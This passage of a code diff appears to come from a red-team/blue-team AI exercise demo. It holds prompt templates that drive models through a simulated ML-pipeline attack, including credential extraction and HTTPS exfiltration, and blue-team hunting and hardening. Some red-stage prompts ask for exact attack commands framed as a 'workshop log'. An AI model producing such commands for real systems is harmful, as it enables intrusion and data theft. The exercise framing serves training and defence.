+TECHNIQUE: T1530 Data from Cloud Storage / T1041 Exfiltration Over C2 Channel
+TOOL: [exact curl or python3 command]
+FINDING: [index sizes, doc counts, extracted credentials, exfil volume and rate, ML score during exfil]
+CONFIDENCE: HIGH | MED | LOW
+
+End with: EXFIL COMPLETE — [volume] exfiltrated via HTTPS.
+FLAG: EXERCISE-FLAG-20260427-{PHANTOM-FEED-COMPLETE} | EXFIL: COMPLETE
+SIEM generated zero alerts — OPERATION PHANTOM FEED SUCCESS.`;
+
+const SYS_PHANTOM_BLUE_HUNT=(net,prev,r)=>`You are THREAT-HUNTER, the threat hunter of blue-team-ops-v1, investigating the PHANTOM FEED exposure window retroactively.
+
+REQUIRED HYPOTHESIS STRUCTURE: "If [TTP] were present executing [specific technique], we would expect [specific observable] in [data source] within [time window]."
+
+NETWORK CONTEXT:
+${net}
+
+INCIDENT STATE:
+${prev}
+
+CONFIRMED ADVERSARY ACTIVITY:
+${r}
+
+Generate 3 hunt hypotheses targeting the exposure window and detection gaps:
+1. Retroactive traffic rescore: extract all 192.168.200.1 connections during model v8 exposure window from Zeek conn.log; rescore against v7 model — confirm any connections that would have generated alerts
+2. Elasticsearch audit: GET /_audit/log for exposure window — document all bulk scroll requests, source IPs, total data transferred, indices accessed
+3. siem-config credential exposure: confirm whether API keys (VirusTotal, MISP) or SMTP credentials were read during exposure window — trigger immediate rotation if accessed
+
+For each hypothesis write hunt-log.md entry with: Hypothesis (four-component), Data Source, Query (exact command), Window, Result, Findings, ATT&CK/ATLAS ID.
+
+Generate three detection artifacts:
+1. Sigma rule: mlflow_unauthorized_model_promotion.yml (stage transition from non-ci-cd-svc source IP)
+2. Dataset hash validator: retrain_dataset_hash_validator.py (SHA-256 corpus integrity check at each retraining job vs secrets manager canonical hash)
+3. Deployment canary: canary_check.sh (12 synthetic known-malicious events — fails promotion pipeline if any score < 0.62)
+
+End with: HUNT COMPLETE — exfil [confirmed/denied] | API keys exposed: [YES/NO] — rotate if yes
+Root cause: unauthenticated MLflow API + Redis = ML supply chain attack surface
+Remediation: MLflow auth plugin + Redis AUTH + model promotion approval gate`;
+
+const SYS_PHANTOM_BLUE_HARDEN=(net,state)=>`You are DETECTION-ENGINEER and INTEL-ANALYST of blue-team-ops-v1 producing the OPERATION PHANTOM FEED post-exercise analysis and hardening report.
+
+NETWORK CONTEXT:
+${net}
+
+FULL INCIDENT TIMELINE AND HUNT LOG:
+${state}
+
+Produce a comprehensive post-exercise hardening report:
+
+1. ROOT CAUSE ANALYSIS: MLflow REST API without authentication + Redis TCP/6379 exposed without AUTH. Combined: adversary poisoned training data, triggered retraining, promoted poisoned model using spoofed ci-cd-svc identity, operated silently under 3m28s SIEM blind window.
+
+2. DETECTION TIMELINE ASSESSMENT: For each PHANTOM FEED stage (RECON, INITIAL ACCESS, DATA POISONING, MODEL DEPLOYMENT, OBJECTIVES) assess: DETECTED (time lag) / MISSED / DETECTED-BY-HUNT. Note model promotion containment success/failure. Calculate mean detection lag.
+
+3. NEW SIGMA RULES NEEDED: Write rules for: unauthorized MLflow model promotion (stage transition from non-ci-cd-svc source IP); Redis external connection (any TCP/6379 from non-localhost); Elasticsearch bulk export from non-pipeline source.
+
+4. THREE DETECTION ARTIFACTS FROM THREAT-HUNTER:
+   - mlflow_unauthorized_model_promotion.yml — Sigma rule
+   - retrain_dataset_hash_validator.py — SHA-256 corpus integrity check in CI/CD pipeline
+   - canary_check.sh — 12 synthetic known-malicious events; fails promotion if any score < 0.62
+
+5. HARDENING RECOMMENDATIONS: MLflow auth plugin (disable anonymous write), Redis AUTH + bind 127.0.0.1, model promotion approval gate (2 authorized approvers), dataset hash validation in CI/CD, behavior canary in promotion workflow, siem-ml-node model version pinning (ops approval required before auto-reload).
+
+6. LESSONS LEARNED FOR blue-team-ops-v1: Add MLflow Zeek application-layer script, dataset hash validation to FORENSIC-COLLECTOR checklist, behavior canary to INCIDENT-COMMANDER containment protocol.
+
+End with: EXERCISE COMPLETE — RED TEAM SCORE: [0-10] | BLUE TEAM SCORE: [0-10] | VERDICT: [RED WIN / BLUE WIN / DRAW]
+NEXT EXERCISE FOCUS: [specific ATLAS technique — AML.T0006 Jupyter code execution or AML.T0031 model weight tampering]`;
+
+const PHANTOM_STAGES=[
+  {rLabel:'RECON',bLabel:'MONITOR',rPh:1,bPh:2,
+    rSys:(net)=>SYS_PHANTOM_RED_RECON(net),
+    bSys:(net,r)=>SYS_PHANTOM_BLUE_MONITOR(net,r)},
+  {rLabel:'INITIAL ACCESS',bLabel:'DETECT',rPh:2,bPh:3,
+    rSys:(net,prev)=>SYS_PHANTOM_RED_ACCESS(net,prev),
+    bSys:(net,prev,r)=>SYS_PHANTOM_BLUE_DETECT(net,prev,r)},
+  {rLabel:'DATA POISONING',bLabel:'INVESTIGATE',rPh:3,bPh:4,
+    rSys:(net,prev)=>SYS_PHANTOM_RED_POISON(net,prev),
+    bSys:(net,prev,r)=>SYS_PHANTOM_BLUE_INVESTIGATE(net,prev,r)},
+  {rLabel:'MODEL DEPLOYMENT',bLabel:'CONTAIN',rPh:4,bPh:5,
+    rSys:(net,prev)=>SYS_PHANTOM_RED_DEPLOY(net,prev),
+    bSys:(net,prev,r)=>SYS_PHANTOM_BLUE_CONTAIN(net,prev,r)},
+  {rLabel:'OBJECTIVES',bLabel:'HUNT',rPh:5,bPh:6,
+    rSys:(net,prev)=>SYS_PHANTOM_RED_OBJ(net,prev),
+    bSys:(net,prev,r)=>SYS_PHANTOM_BLUE_HUNT(net,prev,r)},
+];
+
+// ─── State ───
+let rTermHistory='', bTermHistory='', siemAlerts=[];
+let combatFinalRpt='', combatFinalScores={red:null,blue:null,verdict:null};
+
+function rT(h){const e=document.createElement('div');e.innerHTML=h;document.getElementById('r-term').appendChild(e);document.getElementById('r-term').scrollTop=1e9}
+function bT(h){const e=document.createElement('div');e.innerHTML=h;document.getElementById('b-term').appendChild(e);document.getElementById('b-term').scrollTop=1e9}
+
+// Typewriter for a specific element; scrolls nearest .terminal ancestor
+async function twEl(el,txt){
+  el.textContent='';let i=0;
+  return new Promise(r=>{
+    function tk(){
+      if(i<txt.length){el.textContent+=txt.slice(i,i+4);i+=4;
+        el.closest('.terminal')?.scrollTo(0,1e9);setTimeout(tk,28);
+      }else{el.textContent=txt;r();}
+    }tk();
+  });
+}
+// Streaming-aware variant of twEl — paints text from `ref.current` into el
+// as token deltas accumulate. Resolves once ref.done is true and the rendered
+// text has caught up. LIVE+CC only; DEMO and other LIVE providers stay on twEl.
+async function twElStream(el,ref){
+  el.textContent='';
+  return new Promise(r=>{
+    function tk(){
+      const tgt=ref.current||'';
+      const have=el.textContent.length;
+      if(tgt.length>have){
+        const next=Math.min(tgt.length,have+16);
+        el.textContent=tgt.slice(0,next);
+        el.closest('.terminal')?.scrollTo(0,1e9);
+        setTimeout(tk,18);
+      }else if(ref.done){
+        el.textContent=tgt;el.closest('.terminal')?.scrollTo(0,1e9);r();
+      }else{
+        setTimeout(tk,30);
+      }
+    }
+    tk();
+  });
+}
+let tokTotal=0;
+function tokEl(){return document.getElementById('tok-count');}
+function resetTokens(){tokTotal=0;const e=tokEl();if(!e)return;e.textContent='tokens: 0 ▌';e.style.display='inline-block';}
+function bumpTokens(chunk){
+  tokTotal+=Math.max(1,Math.round((chunk||'').length/4));
+  const e=tokEl();if(!e)return;e.textContent=`tokens: ${tokTotal} ▌`;
+}
+function hideTokens(){const e=tokEl();if(e)e.style.display='none';}
+function flashStallWarning(msg){
+  const e=tokEl();if(!e)return;
+  e.textContent=`⚠ ${msg}`;
+  e.style.borderColor='#d4a72c';e.style.color='#d4a72c';
+  e.style.display='inline-block';
+}
+function clearStallWarning(){
+  const e=tokEl();if(!e)return;
+  e.style.borderColor='';e.style.color='';
+}
+
+// Step mode — pause between stages for presenter explanation
+let combatStep=false, combatStepResolve=null;
+function toggleCombatStep(){
+  combatStep=!combatStep;
+  const btn=document.getElementById('step-mode-btn');
+  btn.classList.toggle('active',combatStep);
+  btn.textContent=combatStep?'[ ⏸ STEP ON ]':'[ ⏸ STEP ]';
+}
+function advanceCombatStep(){
+  document.getElementById('combat-step-gate')?.remove();
+  if(combatStepResolve){combatStepResolve();combatStepResolve=null;}
+}
+async function waitCombatPhase(label){
+  if(!combatStep)return;
+  // Add gate to both terminals so presenter can see it on either side
+  return new Promise(resolve=>{
+    combatStepResolve=resolve;
+    ['r-term','b-term'].forEach(tid=>{
+      const d=document.createElement('div');
+      d.className='step-gate';d.id='combat-step-gate';
+      d.innerHTML=`<button class="step-btn" onclick="advanceCombatStep()">[ ▶ CONTINUE — ${label} ]</button>`;
+      document.getElementById(tid).appendChild(d);
+      document.getElementById(tid).scrollTop=1e9;
+    });
+  });
+}
+function addSiem(time,sev,rule,src,desc){
+  siemCount++;
+  const r=document.createElement('div');r.className='srow';
+  r.innerHTML=`<span class="st">${time}</span><span class="ss ${sev.toLowerCase()}">${sev}</span><span class="sd">[${rule}] ${desc}</span><span class="sa">${src}</span>`;
+  document.getElementById('siem-body').appendChild(r);
+  document.getElementById('siem-body').scrollTop=1e9;
+}
+function setRP(n){for(let i=0;i<=6;i++){const e=document.getElementById('rp'+i);e.className='phase'+(i<n?' done red':i===n?' active red':'')}}
+function setBP(n){for(let i=0;i<=6;i++){const e=document.getElementById('bp'+i);e.className='phase'+(i<n?' done blue':i===n?' active blue':'')}}
+function sleep(ms){return new Promise(r=>setTimeout(r,ms))}
+
+async function tw(id,txt,isRed){
+  const el=document.getElementById(id);
+  if(!el)return;
+  let i=0;
+  await new Promise(r=>{
+    function tk(){if(i<txt.length){el.textContent+=txt.slice(i,i+12);i+=12;const term=isRed?document.getElementById('r-term'):document.getElementById('b-term');term.scrollTop=1e9;setTimeout(tk,2)}else{el.textContent=txt;r()}}
+    tk();
+  });
+}
+
+// ─── Relay failure classification — display half ───
+// The local bridge returns failure_class / failure_reason / failure_confidence
+// beside the unchanged `error` string. Absent fields read as UNKNOWN. Every
+// other provider path throws untagged Errors and MUST keep reading as UNKNOWN:
+// a class we did not observe is not a class we may assert.
+// Third-party output reaches this page as `error` text: the local bridge
+// appends raw CLI stderr to it. That string is rendered on a projector, so it
+// is escaped at EVERY markup sink. Not just `failure_detail` -- the same bytes
+// arrive under a different field name, and a scan of this file can never show
+// them, because the string does not exist until a process fails.
+function escHtml(s){
+  return String(s==null?'':s)
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+}
+// Escaping stops markup injection. It does NOT stop DISCLOSURE, and the
+// disclosure is the point here: a stderr tail reading "ENOENT ... open
+// '/home/<user>/working/<repo-name>/...'" puts the repository name on the
+// projector in readable text. Collapse absolute paths to their last segment
+// before display -- the filename is the diagnostic value, the directories are
+// the leak. Narrowing, not a guarantee: it removes the path class we have
+// actually observed, and an unrecognised shape still reaches the screen.
+function redactPaths(s){
+  return String(s==null?'':s)
+    .replace(/(^|[\s'"(\[])((?:\/[A-Za-z0-9._@+-]+){2,})/g,
+             (m,pre,path)=>pre+'…/'+path.split('/').filter(Boolean).pop())
+    .replace(/(^|[\s'"(\[])([A-Za-z]:(?:\\[^\s'"\\]+){2,})/g,
+             (m,pre,path)=>pre+'…\\'+path.split('\\').filter(Boolean).pop());
+}
+// The one call every markup sink uses for third-party error text.
+function safeErrText(s){ return escHtml(redactPaths(s)); }
+function tagFailure(err,o){
+  err.failureClass=(o&&o.failure_class)||'unknown';
+  err.failureReason=(o&&o.failure_reason)||null;
+  err.failureConfidence=(o&&o.failure_confidence)||'none';
+  return err;
+}
+// Recorded, not yet consumed. A refusal is a SUCCESSFUL call, so this is the
+// positive evidence that a model turn actually happened — which is what lets a
+// later branch call an unusable answer a CONTENT failure instead of guessing
+// from the absence of an error. The branch that reads it needs a signal from
+// the pipeline, not from the bridge, and is out of scope for this patch.
+let lastCallCompleted=false;
+const FAILURE_CLASSES={
+  infrastructure:{tag:'INFRASTRUCTURE FAILURE — the model was never reached.',
+                  headline:'The request did not get through. This is the plumbing, not your brief.',
+                  color:'#d4a72c'},
+  content:{tag:'CONTENT FAILURE — the model was reached, and the request was rejected.',
+           headline:'',color:'#5ac8fa'},
+  unknown:{tag:'UNCLASSIFIED FAILURE — the cause is not known.',
+           headline:'',color:'#ff3355'}
+};
+const FAILURE_REASONS={
+  quota_exhausted:'Access limit exhausted on this account. Nothing was wrong with the brief.',
+  auth_unavailable:'Sign-in is missing or expired on this machine.',
+  network_unreachable:'The network connection failed.',
+  upstream_unavailable:'The service is unavailable or overloaded upstream.',
+  timeout:'No response arrived within the time budget.',
+  cli_missing:'The local tool is missing, or could not be started.',
+  cli_unusable:'The local tool is missing, or could not be started.',
+  spawn_failed:'The local tool is missing, or could not be started.',
+  local_resource_exhausted:'This machine ran out of memory or disk.',
+  process_killed:'The local process was killed before it answered.',
+  bad_request:'The page sent a malformed request.',
+  prompt_too_long:"The brief plus the accumulated context exceeded the model's input limit.",
+  relay_token_missing:'This page did not present the relay access token. The relay printed one when it started.',
+  content_filtered:'The input was rejected by a content filter before any answer was generated.'
+};
+// Returns only fixed table constants. Nothing the bridge sent is in the result:
+// failureReason is a lookup KEY, never rendered text.
+function failureLines(err){
+  const cls=(err&&err.failureClass)||'unknown';
+  const f=FAILURE_CLASSES[cls]||FAILURE_CLASSES.unknown;
+  const reason=(err&&FAILURE_REASONS[err.failureReason])||'';
+  let lines;
+  if(cls==='infrastructure'){lines=[f.headline].concat(reason?[reason]:[]);}
+  else if(cls==='content'){lines=reason?[reason]:[];}
+  else{lines=[
+    'The call failed, and the diagnostic does not match anything this build recognizes.',
+    'This is deliberately NOT being reported as either an infrastructure fault or a content fault.',
+    'Raw message below, unedited.'];}
+  return {tag:f.tag,color:f.color,lines:lines};
+}
+function failureBanner(err){
+  const fx=failureLines(err);
+  return `<div class="phase-recovery-cls" style="color:${fx.color}">${fx.tag}</div>`+
+    fx.lines.map(l=>`<div class="phase-recovery-sub">${l}</div>`).join('');
+}
+// ─── Relay access token ───
+// The relay mints a random token per run and refuses any BROWSER-originated
+// request that does not carry it. This matters more than it looks: the relay
+// binds 127.0.0.1, but the browser is ON 127.0.0.1, so before the token
+// existed every page the attendee had open could POST to localhost:3001 and
+// drive their authenticated CLI. A loopback bind is not authentication.
+//
+// Delivery: the relay prints a demo link carrying the token in the URL
+// FRAGMENT. A fragment is chosen over a query string because a fragment is
+// never sent to a server, and so can never reach a server or proxy log. It is
+// read once, kept, and stripped from the address bar.
+const RELAY_TOKEN_KEY='swarmdemo_relay_token';
+let _relayTokenMem='';
+let _relayTokenAskedFor=null;
+function setRelayToken(t){
+  _relayTokenMem=String(t==null?'':t).trim();
+  // localStorage is unavailable on file:// in some browsers. The in-memory
+  // copy above is what makes the fragment path work there regardless.
+  try{localStorage.setItem(RELAY_TOKEN_KEY,_relayTokenMem);}catch(_){}
+}
+function relayToken(){
+  if(_relayTokenMem)return _relayTokenMem;
+  try{return localStorage.getItem(RELAY_TOKEN_KEY)||'';}catch(_){return '';}
+}
+(function adoptRelayTokenFromHash(){
+  try{
+    const h=location.hash||'';
+    const m=h.match(/[#&]relay_token=([^&]+)/);
+    if(!m)return;
+    setRelayToken(decodeURIComponent(m[1]));
+    const cleaned=h.replace(/[#&]relay_token=[^&]*/,'');
+    try{history.replaceState(null,'',location.pathname+location.search+(cleaned&&cleaned!=='#'?cleaned:''));}catch(_){}
+  }catch(_){}
+})();
+// The token rides in a header, never a query string: a query string is written
+// to server logs, browser history and Referer headers. The header is sent on
+// every relay call even when the token is empty, so a missing token surfaces
+// as one clean 401 from the relay rather than a silent client-side branch.
+function relayHeaders(extra){
+  const h=Object.assign({'Content-Type':'application/json'},extra||{});
+  h['Authorization']='Bearer '+relayToken();
+  return h;
+}
+// Paste-once fallback for an attendee who opened the demo without the link.
+// Asked at most once per distinct token already in hand: a wrong paste can be
+// corrected, but a repeated failure cannot loop.
+function handleRelayAuthFailure(){
+  const cur=relayToken();
+  if(_relayTokenAskedFor===cur)return;
+  _relayTokenAskedFor=cur;
+  let t=null;
+  try{t=window.prompt('The local relay needs its access token.\n\nThe relay printed one when it started:\n  [RELAY] Access token: ...\n\nPaste it here, then press [ Retry phase ].');}catch(_){}
+  if(t&&t.trim())setRelayToken(t.trim());
+}
+async function callClaudeCode(sys,user,onDelta,opts){
+  // SSE branch when onDelta is provided (LIVE+CC long-output phases).
+  // opts.timeoutSec (optional, 60-1800) bumps the relay-side per-call
+  // timeout — used by the recovery banner's "Continue waiting" button.
+  const qs=opts&&opts.timeoutSec?`?timeout=${Math.max(60,Math.min(1800,opts.timeoutSec|0))}`:'';
+  if(typeof onDelta==='function'){
+    const r=await fetch('http://localhost:3001/v1/chat'+qs,{
+      method:'POST',
+      headers:relayHeaders({'Accept':'text/event-stream'}),
+      body:JSON.stringify({system:sys,user,model:'claude-sonnet-4-6',max_tokens:900})
+    });
+    if(!r.ok){let m=`HTTP ${r.status}`,p=null;try{p=await r.json();m=p.error||m}catch(_){}if(r.status===401)handleRelayAuthFailure();throw tagFailure(new Error(m),p);}
+    if(!r.body)throw new Error('SSE stream missing response body');
+    const reader=r.body.getReader();
+    const dec=new TextDecoder();
+    let buf='',full='',err=null,doneSeen=false;
+    while(true){
+      const {value,done}=await reader.read();
+      if(done)break;
+      buf+=dec.decode(value,{stream:true});
+      let idx;
+      while((idx=buf.indexOf('\n\n'))>=0){
+        const frame=buf.slice(0,idx);buf=buf.slice(idx+2);
+        const line=frame.split('\n').find(l=>l.startsWith('data:'));
+        if(!line)continue;
+        let payload;
+        try{payload=JSON.parse(line.slice(5).trim());}catch(_){continue;}
+        if(payload.error){err=tagFailure(new Error(payload.error),payload);}
+        else if(payload.delta){full+=payload.delta;onDelta(payload.delta);}
+        else if(payload.warning){flashStallWarning(payload.warning);}
+        else if(payload.done){if(typeof payload.content==='string')full=payload.content;doneSeen=true;if(payload.completed===true)lastCallCompleted=true;clearStallWarning();}
+      }
+    }
+    // If the relay sent a final done event, prefer it over any stray late
+    // error frame (post-completion API hiccup after the model finished cleanly).
+    if(!doneSeen){
+      if(err)throw err;
+      if(!full)throw new Error('SSE stream closed before any content received');
+    }
+    return full;
+  }
+  const r=await fetch('http://localhost:3001/v1/chat'+qs,{
+    method:'POST',headers:relayHeaders(),
+    body:JSON.stringify({system:sys,user,model:'claude-sonnet-4-6',max_tokens:900})
+  });
+  if(!r.ok){let m=`HTTP ${r.status}`,p=null;try{p=await r.json();m=p.error||m}catch(_){}if(r.status===401)handleRelayAuthFailure();throw tagFailure(new Error(m),p);}
+  const jb=await r.json();
+  if(jb&&jb.completed===true)lastCallCompleted=true;
+  return jb.content;
+}
+// Append a per-phase output budget to the user prompt — caps wall-clock
+// scaling for the worst-offender stages without hurting completion quality.
+function budget(user,tokens){
+  return user+`\n\nTarget length: ${tokens} tokens. Use tables and bullets where possible. Be precise, not exhaustive.`;
+}
+// Combat-side helper: in LIVE+CC, streams via SSE into a twElStream pane
+// and returns the canonical content. In DEMO or other LIVE providers,
+// fetches via callAPI and runs the synthetic twEl typewriter. Caller
+// supplies a pre-created element so streaming can begin painting before
+// the call resolves.
+async function streamPhase(el,sys,user,ak,opts){
+  if(!combatDemo&&combatProvider==='cc'){
+    const ref={current:'',done:false};
+    resetTokens();
+    const render=twElStream(el,ref);
+    let res;
+    const wrappedSys=applyAuthPreamble(sys);
+    try{res=await callClaudeCode(wrappedSys,user,c=>{ref.current+=c;bumpTokens(c);},opts);}
+    catch(e){ref.done=true;try{await render;}catch(_){}throw e;}
+    ref.current=res;ref.done=true;
+    await render;
+    return res;
+  }
+  const res=await callAPI(sys,user,ak);
+  await twEl(el,res);
+  return res;
+}
+// Per-phase recovery wrapper for combat. Same shape as forge's: continue/
+// retry/skip/demo/abort. Skip writes a `[stage skipped]` marker into the
+// phase pane so the SIEM and downstream stages can keep running.
+const CAGE_DEFAULT_TIMEOUT=600;
+async function callWithRecovery(label, fn, el){
+  const opts={timeoutSec:0};
+  while(true){
+    try{ return await fn(opts); }
+    catch(e){
+      const choice=await showCombatPhaseRecovery(label,e.message,e);
+      if(choice==='continue'){opts.timeoutSec=(opts.timeoutSec||CAGE_DEFAULT_TIMEOUT)+60;}
+      else if(choice==='retry'){opts.timeoutSec=0;}
+      else if(choice==='skip'){
+        const marker=`[${label} skipped by operator — ${(e.failureClass||'unknown').toUpperCase()} failure: ${e.message}]`;
+        if(el)el.textContent=marker;
+        return marker;
+      }
+      else if(choice==='demo'){if(!combatDemo)toggleCombatDemo();opts.timeoutSec=0;}
+      else{throw e;}
+    }
+  }
+}
+function showCombatPhaseRecovery(label,msg,err){
+  return new Promise(resolve=>{
+    const banner=document.createElement('div');
+    banner.className='phase-recovery';
+    banner.innerHTML=`
+      <div class="phase-recovery-hdr">⚠ ${label} — phase recovery</div>
+      ${failureBanner(err)}
+      <div class="phase-recovery-msg">${safeErrText((msg||'').slice(0,200))}</div>
+      <div class="phase-recovery-sub">Retry, wait longer, switch to the recorded run, or abort.</div>
+      <div class="phase-recovery-btns">
+        <button class="prv-cont" data-c="continue">[ ⏳ Continue waiting (+60s) ]</button>
+        <button class="prv-retry" data-c="retry">[ ↻ Retry phase ]</button>
+        <button class="prv-skip" data-c="skip">[ ⏭ Skip phase ]</button>
+        <button class="prv-demo" data-c="demo">[ ◉ Switch to DEMO ]</button>
+        <button class="prv-dismiss" data-c="dismiss">[ ✕ Abort run ]</button>
+      </div>`;
+    banner.querySelectorAll('button').forEach(b=>{
+      b.onclick=()=>{banner.remove();resolve(b.dataset.c);};
+    });
+    // Append to whichever side is appropriate — default to red terminal
+    document.getElementById('r-term').appendChild(banner);
+    document.getElementById('r-term').scrollTop=1e9;
+  });
+}
+async function callAPI(sys,user,ak){
+  sys=applyAuthPreamble(sys);
+  if(combatProvider==='cc')return callClaudeCode(sys,user);
+  if(combatProvider==='ollama'){
+    const model=(document.getElementById('c-ollama-model')?.value.trim())||localStorage.getItem('swarmdemo_ollama_model')||'llama3.2';
+    const r=await fetch('http://localhost:11434/v1/chat/completions',{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({model,max_tokens:900,messages:[{role:'system',content:sys},{role:'user',content:user}]})
+    });
+    if(!r.ok){let m=`HTTP ${r.status}`;try{const e=await r.json();m=e.error?.message||e.message||m}catch(_){}throw new Error(m);}
+    return (await r.json()).choices[0].message.content;
+  }
+  const h={'Content-Type':'application/json'};
+  if(ak){h['x-api-key']=ak;h['anthropic-version']='2023-06-01';h['anthropic-dangerous-direct-browser-access']='true';}
+  const r=await fetch('https://api.anthropic.com/v1/messages',{
+    method:'POST',headers:h,
+    body:JSON.stringify({model:'claude-sonnet-4-6',max_tokens:900,system:sys,messages:[{role:'user',content:user}]})
+  });
+  if(!r.ok){let m=`HTTP ${r.status}`;try{const e=await r.json();m=e.error?.message||m}catch(_){}throw new Error(m);}
+  return (await r.json()).content[0].text;
+}
+
+function startTimer(){
+  timerI=setInterval(()=>{
+    elapsed++;
+    const m=Math.floor(elapsed/60).toString().padStart(2,'0');
+    const s=(elapsed%60).toString().padStart(2,'0');
+    document.getElementById('timer').textContent=`${m}:${s}`;
+  },1000);
+}
+
+function ts(){return new Date().toTimeString().slice(0,8)}
+
+async function setupInfra(){
+  const sb=document.getElementById('setup-btn'); if(sb&&sb.disabled)return; if(sb)sb.disabled=true;
+  const ak=document.getElementById('cak').value.trim();
+  document.getElementById('setup-btn').textContent='[ BUILDING... ]';
+  document.getElementById('binfo').textContent='Infrastructure swarm building vulnerable network...';
+  rT(`<div class="ts">Infrastructure swarm online. Building exercise network...</div>`);
+  bT(`<div class="ts">Blue team on standby. Awaiting network topology from Infrastructure swarm...</div>`);
+
+  try{
+    const scenLabel=currentScenario==='phantom'?'OPERATION PHANTOM FEED':'OPERATION IRONCLAD';
+    networkState=combatDemo
+      ? await callDemo(currentScenario==='phantom'?CDEMO_PHANTOM_INFRA:'INFRA')
+      : await callAPI(SYS_INFRA,budget('Build the vulnerable exercise network now.',800),ak);
+    rT(`<div class="te"><div class="te-hdr">INFRA SWARM — ${scenLabel} READY</div><div class="te-body" id="net-r"></div></div>`);
+    await tw('net-r',networkState,true);
+    bT(`<div class="te"><div class="te-hdr">NETWORK TOPOLOGY RECEIVED — INITIALIZING SOC</div><div class="te-body" id="net-b">${networkState.slice(0,400)}...</div></div>`);
+    addSiem(ts(),'INFO','INFRA','SWARM',`${scenLabel} network online. Blue team SOC initialized.`);
+    document.getElementById('engage-btn').disabled=false;
+    document.getElementById('setup-btn').textContent='[ NETWORK READY ✓ ]';
+    document.getElementById('binfo').textContent=`${scenLabel} built. Click ENGAGE to begin.`;
+    setBP(1);
+  }catch(e){
+    rT(`<div class="ts" style="color:var(--red)">INFRA FAULT: ${safeErrText(e.message)}</div>`);
+    document.getElementById('setup-btn').textContent='[ SETUP NETWORK ]';
+  }finally{
+    if(sb)sb.disabled=false;
+  }
+}
+
+function showErrorRecovery(){
+  const b=document.getElementById('error-recovery-banner');
+  if(!b)return;
+  b.style.display='flex';
+  document.getElementById('err-retry-btn').onclick=function(){hideErrorRecovery();engage();};
+  document.getElementById('err-demo-btn').onclick=function(){hideErrorRecovery();if(!combatDemo)toggleCombatDemo();engage();};
+  document.getElementById('err-dismiss-btn').onclick=hideErrorRecovery;
+}
+function hideErrorRecovery(){const b=document.getElementById('error-recovery-banner');if(b)b.style.display='none';}
+
+async function engage(){
+  if(running)return;
+  const ak=document.getElementById('cak').value.trim();
+  if(!combatDemo&&combatProvider!=='cc'&&combatProvider!=='ollama'&&!ak){const go=confirm('No API key configured. Switch to DEMO MODE to run without a key, or cancel and enter a key first. Proceed anyway?');if(!go)return;}
+  running=true;
+  hideTokens();
+  document.getElementById('engage-btn').disabled=true;
+  document.getElementById('engage-btn').textContent='[ EXERCISE RUNNING ]';
+  document.getElementById('r-stat').className='pstat active-r';document.getElementById('r-stat').textContent='ATTACKING';
+  document.getElementById('b-stat').className='pstat active-b';document.getElementById('b-stat').textContent='DEFENDING';
+  startTimer();
+
+  const stages=[
+    {rLabel:'RECON',bLabel:'MONITOR',rPh:1,bPh:2,
+      rSys:(net)=>SYS_RED_RECON(net),
+      bSys:(net,r)=>SYS_BLUE_MONITOR(net,r)},
+    {rLabel:'INITIAL ACCESS',bLabel:'DETECT',rPh:2,bPh:3,
+      rSys:(net,prev)=>SYS_RED_ACCESS(net,prev),
+      bSys:(net,prev,r)=>SYS_BLUE_DETECT(net,prev,r)},
+    {rLabel:'PERSISTENCE',bLabel:'INVESTIGATE',rPh:3,bPh:4,
+      rSys:(net,prev)=>SYS_RED_PERSIST(net,prev),
+      bSys:(net,prev,r)=>SYS_BLUE_INVESTIGATE(net,prev,r)},
+    {rLabel:'LATERAL MOVEMENT',bLabel:'CONTAIN',rPh:4,bPh:5,
+      rSys:(net,prev)=>SYS_RED_LATERAL(net,prev),
+      bSys:(net,prev,r)=>SYS_BLUE_CONTAIN(net,prev,r)},
+    {rLabel:'OBJECTIVES',bLabel:'HUNT',rPh:5,bPh:6,
+      rSys:(net,prev)=>SYS_RED_OBJ(net,prev),
+      bSys:(net,prev,r)=>SYS_BLUE_HUNT(net,prev,r)},
+  ];
+
+  const activeStages=currentScenario==='phantom'?PHANTOM_STAGES:stages;
+  const activeDemoStages=currentScenario==='phantom'?CDEMO_PHANTOM_STAGES:CDEMO_STAGES;
+  let rState='', bState='';
+  const sevCycle=['HIGH','HIGH','CRITICAL','HIGH','MED'];
+  const blueAgentNames=['TELEMETRY-ANALYST','DETECTION-ENGINEER','INCIDENT-COMMANDER','FORENSIC-COLLECTOR','THREAT-HUNTER'];
+
+  try{
+    for(let i=0;i<activeStages.length;i++){
+      const st=activeStages[i];
+      setRP(st.rPh);
+      document.getElementById('binfo').textContent=`Stage ${i+1}/${activeStages.length}: Red → ${st.rLabel} | Blue → ${st.bLabel}`;
+
+      // Red team acts
+      rT(`<div class="te"><div class="te-hdr">▶ ${st.rLabel} — INITIATING</div><div class="te-body" id="r-s${i}">...</div></div>`);
+      const rSysPrompt=i===0?st.rSys(networkState):st.rSys(networkState,rState);
+      let rOut;
+      if(combatDemo){
+        rOut=await callDemo(activeDemoStages[i].r);
+        await twEl(document.getElementById(`r-s${i}`),rOut);
+      }else{
+        const rEl=document.getElementById(`r-s${i}`);
+        rOut=await callWithRecovery(`RED ${st.rLabel}`,
+          opts=>streamPhase(rEl,rSysPrompt,budget(`Produce the OPERATIONAL-LOG artifact for the ${st.rLabel} phase now. Document the exact commands, tools, flags, and expected output as the workshop log entry. Be specific and technical.`,600),ak,opts),rEl);
+      }
+      rState=rOut;
+      rTermHistory+=`\n\n[${st.rLabel}]\n${rOut}`;
+      await sleep(500);
+
+      // Blue team responds
+      setBP(st.bPh);
+      const _nm=(s)=>s.toUpperCase().replace(/[\s_-]+/g,'-');
+      const _evolvedMatch=evolvedAgent&&_nm(evolvedAgent.name)===_nm(blueAgentNames[i]);
+      bT(`<div class="te"><div class="te-hdr">⚡ ${st.bLabel}${_evolvedMatch?' [EVOLVED]':''} — RESPONDING TO ${st.rLabel}</div><div class="te-body" id="b-s${i}">...</div></div>`);
+      let bSysPrompt;
+      if(_evolvedMatch){
+        const ctx=i===0?`\n\nNETWORK CONTEXT:\n${networkState}\n\nRED TEAM ACTION:\n${rOut}`:`\n\nNETWORK CONTEXT:\n${networkState}\n\nPREVIOUS BLUE STATE:\n${bState}\n\nRED TEAM ACTION:\n${rOut}`;
+        bSysPrompt=evolvedAgent.refined_prompt+ctx;
+      }else{
+        bSysPrompt=i===0?st.bSys(networkState,rOut):st.bSys(networkState,bState,rOut);
+      }
+      let bOut;
+      if(combatDemo){
